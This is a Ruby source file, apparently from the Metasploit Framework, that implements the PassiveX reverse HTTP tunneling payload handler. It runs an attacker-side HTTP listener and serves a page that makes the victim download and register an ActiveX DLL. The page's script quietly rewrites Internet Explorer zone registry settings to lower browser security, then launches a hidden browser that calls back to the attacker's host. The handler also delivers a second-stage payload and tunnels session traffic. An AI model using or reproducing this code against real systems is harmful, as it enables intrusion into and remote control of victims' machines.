require 'rex/io/stream_abstraction'
require 'rex/sync/ref'

module Msf
module Handler

###
#
# This handler implements the PassiveX reverse HTTP tunneling interface.
#
###
module PassiveX

	include Msf::Handler

	###
	# 
	# This class wrappers the communication channel built over the HTTP
	# communication protocol between a local session and the remote HTTP
	# client.
	#
	###
	class PxSessionChannel

		include Rex::IO::StreamAbstraction

		def initialize(sid)
			@sid = sid
			@remote_queue = ''

			initialize_abstraction
		
			# Start a thread that monitors the local side of the pipe and writes
			# data from it to the remote side.
			@monitor_thread = Thread.new {
				begin
					begin
						if ((rsock.has_read_data?(1)) and 
						    (buf = rsock.get_once))
							write_remote(buf)
						else
							flush_output
						end
					end while true
				rescue ::Exception
				end
			}
		end

		#
		# Closes the stream abstraction and kills the monitor thread.
		#
		def close
			@monitor_thread.kill if (@monitor_thread)
			@monitor_thread = nil

			cleanup_abstraction
		end

		#
		# Sets the remote HTTP client that is to be used for tunneling output
		# data to the client side.
		#
		def remote=(cli)
			# If we already have a remote, then close it now that we have a new
			# one.
			if (@remote)
				begin
					@remote.server.close_client(@remote)
				rescue ::Exception
				end
			end

			@remote = cli

			flush_output
		end

		#
		# Writes data to the local side of the abstraction that comes in from
		# the remote.
		#
		def write_local(buf)
			dlog("PassiveX:#{self} Writing #{buf.length} to local side", 'core', LEV_3)

			rsock.put(buf)
		end

		#
		# Writes data to the remote HTTP client via an indirect queue.
		#
		def write_remote(buf)
			dlog("PassiveX:#{self} Queuing #{buf.length} to remote side", 'core', LEV_3)

			@remote_queue += buf

			flush_output
		end

		#
		# Flushes the output queue if there is an associated output HTTP client.
		#
		def flush_output
			return if (@remote_queue == nil or @remote_queue.length == 0)

			resp = Rex::Proto::Http::Response.new
			resp.body = @remote_queue

			begin
				if (@remote)
					dlog("PassiveX:#{self} Flushing remote output queue at #{resp.body.length} bytes", 'core', LEV_3)

					@remote.keepalive = false
					@remote.send_response(resp)
					@remote = nil
					@remote_queue = ''
				end
			rescue ::Exception
				dlog("PassiveX:#{self} Exception during remote queue flush: #{$!}", 'core', LEV_0)
			end
		end

	end

	#
	# A PassiveX mixin that is used to extend the Msf::Session class in order
	# to add a reference to the payload handler that created the session in a
	# guaranteed fashion.  In turn, the cleanup routine for the session is
	# modified to call deref_handler on the payload handler if it's defined.
	# This is done to ensure that the tunneling handler stays running while
	# there are sessions that still have references to it.
	#
	module PxSession

		def payload_handler=(p)
			@payload_handler = p
		end

		def cleanup
			super

			@payload_handler.deref_handler if (@payload_handler)
		end
	end

	#
	# Class for wrapping reference counting a specific object for passivex.
	#
	class PxRef
		def initialize
			refinit
		end

		include Rex::Ref
	end

	#
	# Returns the string representation of the handler type, in this case
	# 'reverse_http'.
	#
	def self.handler_type
		return "reverse_http"
	end

	#
	# Returns the connection-described general handler type, in this case
	# 'tunnel'.
	#
	def self.general_handler_type
		"tunnel"
	end

	#
	# Initializes the PassiveX HTTP tunneling handler.
	#
	def initialize(info = {})
		super

		register_options(
			[
				OptAddress.new('PXHOST', [ true, "The local HTTP listener hostname" ]),
				OptPort.new('PXPORT', [ true, "The local HTTP listener port", 8080 ]),
				OptString.new('PXURI', [ false, "The URI root for requests", "/" + Rex::Text.rand_text_alphanumeric(32) ]),
				OptString.new('PXAXCLSID', [ true, "ActiveX CLSID", "B3AC7307-FEAE-4e43-B2D6-161E68ABA838" ]),
				OptString.new('PXAXVER', [ true, "ActiveX DLL Version", "-1,-1,-1,-1" ]),
			], Msf::Handler::PassiveX)

		# Initialize the start of the localized SID pool
		self.sid_pool = 0
		self.session_channels = Hash.new
		self.handler_ref = PxRef.new
	end

	def dll_path
		File.join(Msf::Config.install_root, "data", "passivex", "passivex.dll")
	end

	#
	# Create an HTTP listener that will be connected to and communicated with
	# by the payload that is injected, and possibly used for tunneling
	# purposes.
	#
	def setup_handler
		# Start the HTTP server service on this host/port
		self.service = Rex::ServiceManager.start(Rex::Proto::Http::Server,
			datastore['PXPORT'].to_i, datastore['PXHOST'])

		# Add the new resource
		service.add_resource(datastore['PXURI'],
			'Proc' => Proc.new { |cli, req|
				on_request(cli, req)
			},
			'VirtualDirectory' => true)

		dlog("PassiveX listener started on http://#{datastore['PXHOST']}:#{datastore['PXPORT']}#{datastore['PXURI']}", 'core', LEV_2)

		print_status("PassiveX listener started.")
	end

	#
	# Simply calls stop handler to ensure that things ar ecool.
	#
	def cleanup_handler
	end

	#
	# Basically does nothing.  The service is already started and listening
	# during set up.
	#
	def start_handler
	end

	# 
	# Stops the service and deinitializes it. 
	#
	def stop_handler
		deref_handler
	end

	#
	# PassiveX payloads have a wait-for-session delay of 30 seconds minimum
	# because it can take a bit of time for the OCX to get registered.
	#
	def wfs_delay
		30
	end

	#
	# Called when a new session is created on behalf of this handler.  In this
	# case, we extend the session so that we can track references to the
	# handler since we need to keep the HTTP tunnel up while the session is
	# alive.
	#
	def on_session(session)
		super

		# Extend the session, increment handler references, and set up the
		# session payload handler.
		session.extend(PxSession)
		
		handler_ref.ref

		session.payload_handler = self
	end

	#
	# Decrement the references to the handler that was used by this exploit.
	# If it reaches zero, stop it.
	#
	def deref_handler
		if (handler_ref.deref)
			if (service)
				Rex::ServiceManager.stop_service(service)
	
				self.service.deref
				self.service = nil

				print_status("PassiveX listener stopped.")
			end
	
			flush_session_channels
		end	
	end

protected

	attr_accessor :service # :nodoc:
	attr_accessor :sid_pool # :nodoc:
	attr_accessor :session_channels # :nodoc:
	attr_accessor :handler_ref # :nodoc:

	#
	# Processes the HTTP request from the PassiveX client.  In this case, when
	# a request is made to "/", an HTML body is sent that has an embedded
	# object tag.  This causes the passivex.dll to be downloaded and
	# registered (since registration and downloading have been enabled prior to
	# this point).  After that, the OCX may create a tunnel or download a
	# second stage if instructed by the server.
	#
	def on_request(cli, req)
		sid  = nil
		resp = Rex::Proto::Http::Response.new

		# Grab the SID if one was supplied in the request header.
		if (req['X-Sid'] and 
		    (m = req['X-Sid'].match(/sid=(\d+?)/)))
			sid = m[1]
		end

		# Process the requested resource.
		case req.relative_resource
			when "/"
				# Get a new sid
				self.sid_pool += 1
				nsid = sid_pool

				resp['Content-Type'] = 'text/html'
				# natron 2/27/09: modified to work with IE7/IE8. For some reason on IE8 this can spawn extra set
				# of processes. It works, so will go ahead and commit changes and debug later to run it down.
				resp.body = %Q^<html>  
<object classid="CLSID:#{datastore['PXAXCLSID']}" codebase="#{datastore['PXURI']}/passivex.dll##{datastore['PXAXVER']}">      
   <param name="HttpHost" value="#{datastore['PXHOST']}">  
   <param name="HttpPort" value="#{datastore['PXPORT']}">
   <param name="HttpUriBase" value="#{datastore['PXURI']}">  
   <param name="HttpSid" value="#{nsid}">^ + ((stage_payload) ? %Q^
   <param name="DownloadSecondStage" value="1">^ : "") + %Q^
</object>
<script>
var WshShell = new ActiveXObject("Wscript.Shell");
var marker = true;
var regCheck;
var regRange = "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\ZoneMap\\\\Ranges\\\\random\\\\" //Can be any value
var regIntranet = "HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\Zones\\\\1\\\\";

//Check if we've run this before.
try { regCheck = WshShell.RegRead(regRange + "marker"); } catch (e) { marker = false; }

if (marker == false) {
   //Modify perms for the Intranet zone.
   WshShell.RegWrite(regIntranet + "1001",0,"REG_DWORD");
   WshShell.RegWrite(regIntranet + "1004",0,"REG_DWORD");
   WshShell.RegWrite(regIntranet + "1200",0,"REG_DWORD");
   WshShell.RegWrite(regIntranet + "1201",0,"REG_DWORD");
   WshShell.RegWrite(regIntranet + "1208",0,"REG_DWORD");

   //Map IP to the newly modified zone.
   WshShell.RegWrite(regRange,1,"REG_SZ");
   WshShell.RegWrite(regRange + ":Range","#{datastore['PXHOST']}","REG_SZ");
   WshShell.RegWrite(regRange + "*",1,"REG_DWORD");
   WshShell.RegWrite(regRange + "marker",1,"REG_DWORD"); //Just a marker

   //Clean up after the original passivex stage1 loader; reset to default IE7 install
   var regDefault = "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\Zones\\\\3\\\\";
   WshShell.RegWrite(regDefault + "1001",1,"REG_DWORD");
   WshShell.RegWrite(regDefault + "1004",3,"REG_DWORD");
   WshShell.RegWrite(regDefault + "1200",0,"REG_DWORD");
   WshShell.RegWrite(regDefault + "1201",3,"REG_DWORD");

   //Clean up and delete the created entries
   setTimeout('WshShell.RegDelete(regIntranet + "1001")', 60000);
   setTimeout('WshShell.RegDelete(regIntranet + "1004")', 60000);
   setTimeout('WshShell.RegDelete(regIntranet + "1200")', 60000);
   setTimeout('WshShell.RegDelete(regIntranet + "1201")', 60000);
   setTimeout('WshShell.RegDelete(regIntranet + "1208")', 60000);
   setTimeout('WshShell.RegDelete(regRange)', 60000);

   WshShell.Run("iexplore.exe -new http://#{datastore['PXHOST']}:#{datastore['PXPORT']}#{datastore['PXURI']}",0,false);
}
</script>
</html>^

				# Create a new local PX session with the supplied sid
				new_session_channel(nsid)
				
				print_status("Sending PassiveX main page to client")
			when "/passivex.dll"
				resp['Content-Type'] = 'application/octet-stream'
				resp.body = ''
				
				File.open(dll_path, "rb") { |f|
					resp.body = f.read
				}
				
				print_status("Sending PassiveX DLL (#{resp.body.length} bytes)")
			when "/stage"
				resp.body = generate_stage

				# Now that we've transmitted a second stage, it's time to indicate
				# that we've found a new session.  We call handle_connection using
				# the lsock of the local stream.
				if (s = find_session_channel(sid))
					Thread.new {
						begin
							handle_connection(s.lsock)
						rescue ::Exception
							elog("Exception raised during PX handle connection: #{$!}", 'core', LEV_1)

							dlog("Call stack:\n#{$@.join("\n")}", 'core', LEV_3)
						end
					}
				end

				print_status("Sending stage to sid #{sid} (#{resp.body.length} bytes)")
			when "/tunnel_in"
				s.write_local(req.body) if (s = find_session_channel(sid))
			when "/tunnel_out"
				cli.keepalive = true
				resp = nil

				s.remote = cli if (s = find_session_channel(sid))
			else
				resp.code    = 404
				resp.message = "Not found"
		end

		cli.send_response(resp) if (resp)
	end

	#
	# Creates a new session with the supplied sid.
	#
	def new_session_channel(sid)
		self.session_channels[sid.to_i] = PxSessionChannel.new(sid)
	end

	#
	# Finds a session based on the supplied sid
	#
	def find_session_channel(sid)
		session_channels[sid.to_i]
	end

	#
	# Flushes all existing session_channels and cleans up any resources associated with
	# them.
	#
	def flush_session_channels
		session_channels.each_pair { |sid, session|
			session.close
		}

		session_channels = Hash.new
	end

end

end
end
